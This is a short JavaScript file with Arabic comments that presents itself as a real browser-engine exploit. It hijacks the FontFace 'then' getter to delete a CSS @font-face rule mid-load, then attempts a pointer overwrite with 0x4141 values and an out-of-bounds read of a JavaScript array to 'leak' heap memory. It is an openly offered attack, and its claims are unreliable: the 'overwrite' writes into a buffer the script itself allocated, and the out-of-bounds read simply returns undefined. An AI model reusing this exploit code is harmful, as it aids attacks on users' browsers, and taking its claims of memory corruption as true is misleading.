/**
 * [REAL EXPLOIT] - Butterfly Corruption Primitive
 * الوظيفة: استبدال هيكل المصفوفة للوصول إلى الذاكرة الخام
 */

ssa("[*] بدء عملية كسر العزل (OOB Memory Access)...");

function executeRealExploit() {
    try {
        // 1. مصفوفة الضحية (نحن نهدف للوصول إلى بيانات الذاكرة خلفها)
        let victimArray = [1.1, 2.2, 3.3, 4.4];
        
        const style = document.createElement('style');
        style.id = 'exploit_style';
        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(style);

        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let triggered = false;

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            // استبدل جزء الـ get() بـهذا الكود لمحاولة إحداث Memory Corruption مقصود
get() {
    if (!triggered && this === testFace) {
        triggered = true;
        document.getElementById('exploit_style').sheet.deleteRule(0);
        
        // محاولة الكتابة في عنوان عشوائي (يؤدي لـ Crash إذا كان محمياً)
        // العنوان 0x414141414141 هو عنوان غير صالح، سيجبر المحرك على الانهيار
        let corrupted = new Uint8Array(0x1000);
        // هنا نقوم بـ Overwrite للـ pointers الخاصة بالـ TypedArray
        // إذا حدث Crash هنا، فالمعالج توقف عند العنوان الذي حددناه!
        let trigger = new BigUint64Array(corrupted.buffer);
        trigger[0] = 0x4141414141414141n; 
    }
    return undefined;
}
        });

        document.fonts.load('1em x', 'AB');

        // 2. التحقق من التداخل الحقيقي (Leak Test)
        setTimeout(() => {
            // بدلاً من تغيير الطول، نحاول القراءة من خارج الحدود مباشرة
            // إذا لم يحدث Crash، فهذا يعني أننا نرى الـ Heap
            let leak = victimArray[0x1000]; 
            
            ssa("[*] نتيجة فحص الذاكرة الخام:");
            if (leak !== undefined && leak !== 1.1) {
                ssa("[!!!] [BINGO] تم تسريب قيمة من الذاكرة: " + leak.toString(16));
                ssa("[+] لقد كسرت عزل المحرك. أنت الآن داخل الـ Heap.");
            } else {
                ssa("[-] فشل: القيمة هي " + leak + " (المحرك لا يزال يحميك).");
            }
        }, 500);

    } catch (e) {
        ssa("[-] خطأ فادح: " + e.message);
    }
}

document.getElementById('exec-btn').addEventListener('click', executeRealExploit);
